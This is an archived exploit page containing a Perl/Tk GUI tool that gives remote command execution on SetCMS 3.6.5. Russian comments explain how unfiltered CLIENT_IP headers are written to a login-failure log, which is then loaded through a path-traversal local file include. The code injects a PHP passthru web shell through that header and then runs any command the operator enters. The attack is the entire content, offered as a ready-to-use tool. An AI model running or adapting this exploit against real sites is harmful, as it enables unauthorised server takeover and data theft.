<html><head><title>SetCMS 3.6.5 (setcms.org) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

## SetCMS v3.6.5 (setcms.org) remote commands execution exploit by RST/GHC
## o4.o9.2oo6
## (c)oded by 1dt.w0lf

## THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
## KEEP IT PRIVATE

## про багу:
##
## file: functions.php
##
## FUNCTION ip(){
## global $user_id;
## if(getenv('HTTP_CLIENT_IP')) {$user_ip = getenv('HTTP_CLIENT_IP');}
## elseif(getenv('HTTP_X_FORWARDED_FOR')){$user_ip = getenv('HTTP_X_FORWARDED_FOR');}
## elseif(getenv('REMOTE_ADDR')) {$user_ip = getenv('REMOTE_ADDR');}
## else{$user_ip='unknown';}
## if(15 &lt; strlen($user_ip))
## {
## $ar = split(', ', $user_ip);
## for($i=0; $i &lt; sizeof($ar); $i++)
## {
## if($ar[$i]!='' and !ereg('[a-zA-Z]', $ar[$i])){$user_ip = $ar[$i]; break; }
## if($i==sizeof($user_ip_pass)-1){$user_ip = 'unknown';}
## }
## }
## if(ereg('unknown', $user_ip) and $user_id!=''){ $user_ip .= $user_id; }
## return $user_ip;
## }
##
## таким образом заголовки HTTP не фильтруются и можно передать необходимые данные в CLIENT_IP или X_FORWARDED_FOR
## ... далее
##
## file: modules/users/index.php
##
## if ($mc == &quot;enter&quot; &amp;&amp; (!isset($do) || $do == &quot;&quot;))
## {
## ...
## if ($enter == &quot;0&quot;)
## {
## $fp = fopen(&quot;files/enter.set&quot;, &quot;a+&quot;);
## flock($fp, LOCK_EX);
## fwrite($fp, &quot;$date::&quot;.regreplace($_POST['login']).&quot;::&quot;.regreplace($_POST['pass']).&quot;::$ip::\r\n&quot;);
## flock($fp, LOCK_UN);
## fclose($fp);
## $text.= &quot;&lt;center&gt;Неправильное сочетание имени пользователя и пароля. Информация о вашей попытке входа записана в лог-файл.&lt;/center&gt;&quot;;
##
## При неудачной попытке входа, отправленные данные записываются в файл files/enter.set, включая $ip =)
##
## И заканчивая
##
## file: index.php
##
## $set = $_GET['set'];
## ...
## //urls
## if (file_exists(&quot;modules/$set/index.php&quot;))
## {
## if(file_exists(&quot;modules/$set/config.php&quot;)){include(&quot;modules/$set/config.php&quot;);}
## include(&quot;modules/$set/index.php&quot;);
## }
##
## Локальный инклуд налицо =)
## index.php?set=../files/enter.set%00
## Правда при условии magic = off
##
## eof

use Tk;
use Tk::Menu;
use LWP::UserAgent;
use Tk::DialogBox;

$top = MainWindow-&gt;new();
$top-&gt;resizable(0,0);

$path = 'http://server/setcms/index.php';
$cmd = 'id; uname -a; ls -la';
$xpl = LWP::UserAgent-&gt;new() or die;

$top-&gt;title(&quot;r57setcms365&quot;);
Dialog2::ui($top);

Dialog2::run() if defined &amp;Dialog2::run;

Tk::MainLoop();

sub Dialog2::ui {
our($root) = @_;


# Widget Initialization
$_entry_1 = $root-&gt;Entry(
-font =&gt; 'Verdana 8',
-relief =&gt; &quot;groove&quot;,
-textvariable =&gt; \$path,
-width =&gt; 0,
);
$_entry_2 = $root-&gt;Entry(
-font =&gt; 'Verdana 8',
-relief =&gt; &quot;groove&quot;,
-textvariable =&gt; \$cmd,
-width =&gt; 0,
);
our($_label_1) = $root-&gt;Label(
-font =&gt; 'Verdana 8',
-text =&gt; &quot;Path to index.php : &quot;,
);
our($_label_2) = $root-&gt;Label(
-font =&gt; 'Verdana 8',
-text =&gt; &quot;Command for execute : &quot;,
);
our($_label_3) = $root-&gt;Label(
-font =&gt; 'Verdana 8',
-text =&gt; &quot; &gt;&gt;&gt; SetCMS 3.6.5 RCE sploit by RST/GHC&quot;,
);
our($_button_1) = $root-&gt;Button(
-font =&gt; 'Verdana 8 bold',
-relief =&gt; &quot;groove&quot;,
-text =&gt; &quot;Execute command&quot;,
);
our($_button_2) = $root-&gt;Button(
-font =&gt; 'Verdana 8 bold',
-relief =&gt; &quot;groove&quot;,
-text =&gt; &quot;Create shell&quot;,
);
$_text_1 = $root-&gt;Text(
-font =&gt; 'Verdana 8',
-height =&gt; 0,
-relief =&gt; &quot;groove&quot;,
-width =&gt; 0,
);
our($_label_4) = $root-&gt;Label(
-font =&gt; 'Verdana 8',
-text =&gt; &quot; (c)oded by 1dt.w0lf , RST/GHC , o4/o9/2oo6 , priv8&quot;,
);

# widget commands


$_button_1-&gt;configure(
-command =&gt; \&amp;execute
);
$_button_2-&gt;configure(
-command =&gt; \&amp;create_shell
);


# Geometry Management
$_entry_1-&gt;grid(
-in =&gt; $root,
-column =&gt; 2,
-row =&gt; 2,
-columnspan =&gt; 2,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 4,
-pady =&gt; 4,
-rowspan =&gt; 1,
-sticky =&gt; &quot;ew&quot;
);
$_entry_2-&gt;grid(
-in =&gt; $root,
-column =&gt; 2,
-row =&gt; 3,
-columnspan =&gt; 2,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 4,
-pady =&gt; 4,
-rowspan =&gt; 1,
-sticky =&gt; &quot;ew&quot;
);
$_label_1-&gt;grid(
-in =&gt; $root,
-column =&gt; 1,
-row =&gt; 2,
-columnspan =&gt; 1,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 0,
-pady =&gt; 0,
-rowspan =&gt; 1,
-sticky =&gt; &quot;e&quot;
);
$_label_2-&gt;grid(
-in =&gt; $root,
-column =&gt; 1,
-row =&gt; 3,
-columnspan =&gt; 1,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 0,
-pady =&gt; 0,
-rowspan =&gt; 1,
-sticky =&gt; &quot;e&quot;
);
$_label_3-&gt;grid(
-in =&gt; $root,
-column =&gt; 1,
-row =&gt; 1,
-columnspan =&gt; 3,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 0,
-pady =&gt; 0,
-rowspan =&gt; 1,
-sticky =&gt; &quot;w&quot;
);
$_button_1-&gt;grid(
-in =&gt; $root,
-column =&gt; 3,
-row =&gt; 4,
-columnspan =&gt; 1,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 4,
-pady =&gt; 4,
-rowspan =&gt; 1,
-sticky =&gt; &quot;&quot;
);
$_button_2-&gt;grid(
-in =&gt; $root,
-column =&gt; 2,
-row =&gt; 4,
-columnspan =&gt; 1,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 4,
-pady =&gt; 4,
-rowspan =&gt; 1,
-sticky =&gt; &quot;e&quot;
);
$_text_1-&gt;grid(
-in =&gt; $root,
-column =&gt; 1,
-row =&gt; 5,
-columnspan =&gt; 3,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 5,
-pady =&gt; 5,
-rowspan =&gt; 1,
-sticky =&gt; &quot;news&quot;
);
$_label_4-&gt;grid(
-in =&gt; $root,
-column =&gt; 1,
-row =&gt; 6,
-columnspan =&gt; 2,
-ipadx =&gt; 0,
-ipady =&gt; 0,
-padx =&gt; 0,
-pady =&gt; 0,
-rowspan =&gt; 1,
-sticky =&gt; &quot;w&quot;
);


# Resize Behavior
$root-&gt;gridRowconfigure(1, -weight =&gt; 0, -minsize =&gt; 6, -pad =&gt; 0);
$root-&gt;gridRowconfigure(2, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
$root-&gt;gridRowconfigure(3, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
$root-&gt;gridRowconfigure(4, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
$root-&gt;gridRowconfigure(5, -weight =&gt; 0, -minsize =&gt; 361, -pad =&gt; 0);
$root-&gt;gridRowconfigure(6, -weight =&gt; 0, -minsize =&gt; 21, -pad =&gt; 0);
$root-&gt;gridColumnconfigure(1, -weight =&gt; 0, -minsize =&gt; 110, -pad =&gt; 0);
$root-&gt;gridColumnconfigure(2, -weight =&gt; 0, -minsize =&gt; 291, -pad =&gt; 0);
$root-&gt;gridColumnconfigure(3, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
}

sub create_shell()
{
$_text_1-&gt;delete(&quot;0.0&quot;,'end');
$already = 0;
$res = $xpl-&gt;get($path.&quot;?set=../files/enter.set%00&quot;);
if(!$res-&gt;is_success) { &amp;connect_error(); }
else
{
if($res-&gt;content =~ /pes_barbos/) { $already = 1; }
}
if($already) { $_text_1-&gt;insert('end', &quot;[!] Shell already created\n&quot;); }
else {
$res = $xpl-&gt;post($path.&quot;?set=users&amp;mc=enter&quot;,
[
'login' =&gt; 'pes_barbos',
'pass' =&gt; 'pes_barbos',
],
'CLIENT_IP' =&gt; '86.12.56.33 &lt;? if(isset($_POST[\'RSTGHC\'])){ echo &quot;R57SETCMSXPL&quot;; passthru($_POST[\'RSTGHC\']); echo &quot;R57SETCMSXPL&quot;; } ?&gt;',
);
if(!$res-&gt;is_success) { &amp;connect_error(); }
else
{
$_text_1-&gt;insert('end', &quot;[+] Shell created!\n[+] Now you can execute commands!\n&quot;);
}
}
}

sub execute()
{
$_text_1-&gt;delete(&quot;0.0&quot;,'end');
$_text_1-&gt;insert('end',&quot;[~] Try execute command\n&quot;);
$res = $xpl-&gt;post($path.&quot;?set=../files/enter.set%00&quot;,['RSTGHC'=&gt;$cmd]);
if(!$res-&gt;is_success) { &amp;connect_error(); }
else
{
@rez = split(&quot;R57SETCMSXPL&quot;,$res-&gt;content);
$_text_1-&gt;insert('end',@rez[1]);
$_text_1-&gt;insert('end',&quot;[+] EOF\n&quot;);
}
}

sub connect_error()
{
$_text_1-&gt;insert('end', &quot;[-] Error: &quot;.$res-&gt;status_line.&quot;\n&quot;);
}
1;

# milw0rm.com [2008-01-22]</pre></html>